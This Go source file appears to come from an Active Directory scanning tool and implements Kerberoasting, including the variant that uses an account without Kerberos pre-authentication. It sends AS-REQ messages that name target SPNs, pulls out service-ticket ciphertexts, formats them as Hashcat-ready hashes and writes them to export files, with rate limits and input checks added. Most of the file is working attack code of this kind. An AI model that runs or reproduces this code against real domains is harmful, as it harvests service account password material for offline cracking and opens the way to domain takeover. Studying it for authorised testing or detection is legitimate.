package adscan

import (
	"bufio"
	"context"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

const kerberosInputLimit = 1 << 20

func readKerberosFile(path string) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil {
		return nil, err
	}
	if !st.Mode().IsRegular() || st.Size() > kerberosInputLimit {
		return nil, fmt.Errorf("нужен обычный файл до 1 МиБ")
	}
	b, err := io.ReadAll(io.LimitReader(f, kerberosInputLimit+1))
	if len(b) > kerberosInputLimit {
		return nil, fmt.Errorf("файл превышает 1 МиБ")
	}
	return b, err
}

// ReadKerberosList accepts comma/space-separated values or @path with one
// value per line. File comments and blank lines do not consume the limit.
func ReadKerberosList(input string, limit int) ([]string, error) {
	if limit < 1 || limit > 50000 {
		return nil, fmt.Errorf("лимит списка: 1–50000")
	}
	input = strings.TrimSpace(input)
	var values []string
	if strings.HasPrefix(input, "@") {
		b, err := readKerberosFile(strings.TrimSpace(input[1:]))
		if err != nil {
			return nil, err
		}
		scan := bufio.NewScanner(strings.NewReader(strings.TrimPrefix(string(b), "\ufeff")))
		for scan.Scan() {
			value := strings.TrimSpace(scan.Text())
			if value == "" || strings.HasPrefix(value, "#") {
				continue
			}
			if len(values) >= limit {
				return nil, fmt.Errorf("список превышает лимит %d", limit)
			}
			values = append(values, value)
		}
		if err := scan.Err(); err != nil {
			return nil, err
		}
	} else {
		if len(input) > kerberosInputLimit {
			return nil, fmt.Errorf("список превышает 1 МиБ")
		}
		values = strings.FieldsFunc(input, func(r rune) bool { return r == ',' || r == ' ' || r == '\t' || r == '\r' || r == '\n' })
	}
	if len(values) > limit {
		return nil, fmt.Errorf("список превышает лимит %d", limit)
	}
	return values, nil
}

// ValidateKerberoastOptions validates the selected mode before any network IO.
func ValidateKerberoastOptions(o *AccessOptions) error {
	if o.MaxObjects == 0 {
		o.MaxObjects = 5000
	}
	if o.MaxObjects < 1 || o.MaxObjects > 50000 {
		return fmt.Errorf("лимит SPN: 1–50000")
	}
	if o.RPS < 0 || o.RPS > 20 {
		return fmt.Errorf("Kerberos RPS: 1–20 (0 — по умолчанию)")
	}
	o.NoPreauthUser, o.TGTFile = strings.TrimSpace(o.NoPreauthUser), strings.TrimSpace(o.TGTFile)
	if o.NoPreauthUser != "" && o.TGTFile != "" {
		return fmt.Errorf("выбери один режим: учётка без pre-auth или файл TGT")
	}
	alternate := o.NoPreauthUser != "" || o.TGTFile != ""
	if alternate && (o.Credential.Username != "" || o.Credential.Secret != "") {
		return fmt.Errorf("режим без пароля/TGT используется отдельно от сохранённой учётки")
	}
	if !alternate && o.Credential.Username == "" {
		return fmt.Errorf("выбери доменную учётку, логин без pre-auth или файл TGT")
	}
	if o.NoPreauthUser != "" {
		users, err := NormalizeASREPUsers([]string{o.NoPreauthUser}, o.Domain, 1)
		if err != nil || len(users) != 1 {
			return fmt.Errorf("некорректный логин без pre-auth")
		}
		o.NoPreauthUser = users[0]
	}
	if alternate {
		targets, err := explicitRoastTargets(o.SPNs, o.Domain, o.MaxObjects)
		if err != nil {
			return err
		}
		if len(targets) == 0 {
			return fmt.Errorf("укажи SPN или @файл SPN; в выбранном режиме LDAP-вход не выполняется")
		}
	} else if _, err := explicitRoastTargets(o.SPNs, o.Domain, o.MaxObjects); err != nil {
		return err
	}
	if len(o.TGSEtypes) == 0 {
		o.TGSEtypes = []int32{18, 17, 23}
		if o.NoPreauthUser != "" {
			o.TGSEtypes = []int32{23, 18, 17}
		}
	}
	for _, etype := range o.TGSEtypes {
		if etype != 17 && etype != 18 && etype != 23 {
			return fmt.Errorf("TGS etype: только 17,18,23")
		}
	}
	return nil
}

// An optional SPN|sAMAccountName supplies the AES salt principal without LDAP.
func explicitRoastTargets(values []string, realm string, limit int) ([]roastTarget, error) {
	bySPN := map[string]roastTarget{}
	for _, value := range values {
		spn, owner, hasOwner := strings.Cut(strings.TrimSpace(value), "|")
		spns, err := normalizeSPNs([]string{spn}, limit)
		if err != nil || len(spns) != 1 {
			return nil, fmt.Errorf("некорректный SPN: %q", spn)
		}
		if hasOwner {
			users, err := NormalizeASREPUsers([]string{owner}, realm, 1)
			if err != nil || len(users) != 1 || strings.Contains(owner, "|") {
				return nil, fmt.Errorf("владелец SPN: укажи SPN|логин")
			}
			owner = users[0]
		}
		key := strings.ToLower(spns[0])
		if old, ok := bySPN[key]; ok {
			if old.User != "" && owner != "" && !strings.EqualFold(old.User, owner) {
				return nil, fmt.Errorf("для SPN указаны разные владельцы")
			}
			if owner == "" {
				continue
			}
		} else if len(bySPN) >= limit {
			return nil, fmt.Errorf("SPN превышают лимит %d", limit)
		}
		bySPN[key] = roastTarget{User: owner, SPN: spns[0], Machine: strings.HasSuffix(owner, "$")}
	}
	out := make([]roastTarget, 0, len(bySPN))
	for _, target := range bySPN {
		out = append(out, target)
	}
	sort.Slice(out, func(i, j int) bool { return strings.ToLower(out[i].SPN) < strings.ToLower(out[j].SPN) })
	return out, nil
}

func roastExchange(ctx context.Context, address string, o AccessOptions) func([]byte) ([]byte, error) {
	if o.RPS <= 0 {
		o.RPS = 2
	}
	if o.Timeout <= 0 {
		o.Timeout = 5 * time.Second
	}
	var next time.Time
	return func(packet []byte) ([]byte, error) {
		if wait := time.Until(next); wait > 0 {
			timer := time.NewTimer(wait)
			defer timer.Stop()
			select {
			case <-ctx.Done():
				return nil, ctx.Err()
			case <-timer.C:
			}
		}
		next = time.Now().Add(time.Second / time.Duration(o.RPS))
		q, stop := context.WithTimeout(ctx, o.Timeout)
		defer stop()
		return kerberosTCP(q, address, packet)
	}
}

func preserveRoastCipher(r *AccessReport, ticket messages.Ticket, dir string) error {
	data := map[string]any{"spn": ticket.SName.PrincipalNameString(), "realm": ticket.Realm, "etype": ticket.EncPart.EType, "ciphertext_hex": hex.EncodeToString(ticket.EncPart.Cipher), "hashcat_ready": false}
	b, err := json.Marshal(data)
	if err != nil {
		return err
	}
	if dir == "" {
		r.add("tgs-cipher/"+ticket.SName.PrincipalNameString(), "Ciphertext TGS: нужны AES-метаданные", "incomplete", "info", string(b))
		return nil
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		return err
	}
	f, err := os.CreateTemp(dir, "kerberoast-pending-*.json")
	if err != nil {
		return err
	}
	name := f.Name()
	if err = f.Chmod(0600); err == nil {
		_, err = f.Write(b)
	}
	err = errors.Join(err, f.Close())
	if err != nil {
		os.Remove(name)
		return err
	}
	r.Artifacts = append(r.Artifacts, name)
	return nil
}

func runNoPreauthRoastAt(ctx context.Context, address string, o AccessOptions, targets []roastTarget, r AccessReport) (AccessReport, error) {
	if err := ValidateKerberoastOptions(&o); err != nil {
		return r, err
	}
	realm := strings.ToUpper(o.Domain)
	cfg := config.New()
	cfg.LibDefaults.NoAddresses = true
	cfg.LibDefaults.DefaultTktEnctypeIDs = o.TGSEtypes
	client := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, o.NoPreauthUser)
	exchange := roastExchange(ctx, address, o)
	var hashes []string
	finish := func(err error) (AccessReport, error) {
		if len(hashes) > 0 && o.ExportDir != "" {
			path, e := exportKerberosHashes(o.ExportDir, "kerberoast", hashes)
			if e == nil {
				r.Artifacts = append(r.Artifacts, path)
			} else {
				r.add("kerberoast-export", "Экспорт билетов", "error", "info", e.Error())
				err = errors.Join(err, e)
			}
		}
		return r, err
	}
	for _, target := range targets {
		if err := ctx.Err(); err != nil {
			return finish(err)
		}
		if o.Progress != nil {
			o.Progress("AS-REQ без pre-auth · " + target.SPN)
		}
		sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, target.SPN)
		req, err := messages.NewASReq(realm, cfg, client, sname)
		var rep messages.ASRep
		if err == nil {
			var packet, reply []byte
			packet, err = req.Marshal()
			if err == nil {
				reply, err = exchange(packet)
				if err == nil {
					err = rep.Unmarshal(reply)
				}
			}
		}
		if err := ctx.Err(); err != nil {
			return finish(err)
		}
		if err != nil {
			state := "error"
			var ke messages.KRBError
			if errors.As(err, &ke) {
				state = "denied"
				if ke.ErrorCode == errorcode.KDC_ERR_S_PRINCIPAL_UNKNOWN {
					state = "negative"
				}
				if ke.ErrorCode == errorcode.KDC_ERR_PREAUTH_REQUIRED || ke.ErrorCode == errorcode.KDC_ERR_C_PRINCIPAL_UNKNOWN || ke.ErrorCode == errorcode.KDC_ERR_CLIENT_REVOKED {
					r.add("kerberoast-nopreauth", "Учётка без pre-auth: "+o.NoPreauthUser, "denied", "info", "KDC отклонил выбранную учётку или требует pre-auth; проверка остановлена. "+ke.Error())
					return finish(err)
				}
			}
			r.add("tgs/"+target.SPN, "AS-REQ сервис: "+target.SPN, state, "info", err.Error())
			continue
		}
		if rep.PVNO != 5 || !rep.CName.Equal(client) || !strings.EqualFold(rep.CRealm, realm) || rep.Ticket.TktVNO != 5 || !rep.Ticket.SName.Equal(sname) || !strings.EqualFold(rep.Ticket.Realm, realm) || !containsEtype(o.TGSEtypes, rep.Ticket.EncPart.EType) || len(rep.Ticket.EncPart.Cipher) < 44 {
			r.add("tgs/"+target.SPN, "AS-REQ сервис: "+target.SPN, "error", "info", "Ответ KDC относится к другому пользователю, сервису, realm или etype; referrals не выполняются")
			continue
		}
		salt, user := target.User, target.User
		if user == "" {
			user = target.SPN
		}
		if rep.Ticket.EncPart.EType == 17 || rep.Ticket.EncPart.EType == 18 {
			if target.User == "" {
				err = fmt.Errorf("для AES укажи владельца: SPN|логин")
			} else {
				salt, err = roastSaltUser(cfg, realm, target.User, rep.Ticket.EncPart.EType, exchange)
			}
			if err != nil {
				if e := preserveRoastCipher(&r, rep.Ticket, o.ExportDir); e != nil {
					return finish(e)
				}
				r.add("tgs/"+target.SPN, "AS-REQ сервис: "+target.SPN, "incomplete", "info", "AES-билет сохранён; Hashcat-метаданные не определены: "+err.Error())
				if ctx.Err() != nil {
					return finish(ctx.Err())
				}
				continue
			}
		}
		hash, err := tgsHash(rep.Ticket, user, salt)
		if err != nil {
			r.add("tgs/"+target.SPN, "AS-REQ сервис: "+target.SPN, "error", "info", err.Error())
			continue
		}
		hashes = append(hashes, hash)
		r.add("tgs/"+target.SPN, "Kerberoast без пароля: "+target.SPN, "confirmed", "info", fmt.Sprintf("Учётка запроса %s; etype %d; ciphertext сервисного билета получен через AS-REQ и подготовлен для Hashcat. Пароль не проверялся; ответ проверен структурно, сеансовый ключ неизвестен.", o.NoPreauthUser, rep.Ticket.EncPart.EType))
		if o.ExportDir == "" {
			r.add("tgs-hash/"+target.SPN, "Hashcat билет сервиса", "observed", "info", hash)
		}
	}
	return finish(nil)
}
